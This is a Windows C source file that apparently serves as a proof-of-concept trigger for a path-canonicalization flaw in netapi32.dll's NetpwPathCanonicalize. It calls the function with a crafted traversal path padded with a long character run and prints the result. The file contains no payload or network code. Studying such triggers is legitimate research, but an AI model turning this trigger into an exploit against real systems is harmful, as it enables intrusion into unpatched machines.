#include <windows.h>
#include <stdio.h>

typedef int (__stdcall *MYPROC) (LPWSTR,  LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD);

int main(int argc, char* argv[])
{
    WCHAR path[256];
    WCHAR can_path[256];
    DWORD type = 1000; 
    int retval;
    HMODULE handle = LoadLibrary(".\\netapi32.dll");
    MYPROC Trigger = NULL;

    if (NULL == handle)
    {
        wprintf(L"Fail to load library!\n");
        return -1;
    }

    Trigger = (MYPROC)GetProcAddress(handle, "NetpwPathCanonicalize");
    if (NULL == Trigger)
    {
        FreeLibrary(handle);
        wprintf(L"Fail to get api address!\n");
        return -1;
    }

    path[0] = 0;
    wcscpy(path, L"\\aaa\\..\\..\\bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");
    can_path[0] = 0;
    type = 1000;
    wprintf(L"BEFORE: %s\n", path);
    retval = (Trigger)(path, can_path, 1000, NULL, &type, 1);
    wprintf(L"AFTER : %s\n", can_path);
    wprintf(L"RETVAL: %s(0x%X)\n\n", retval?L"FAIL":L"SUCCESS", retval);

    FreeLibrary(handle);

    return 0;
}

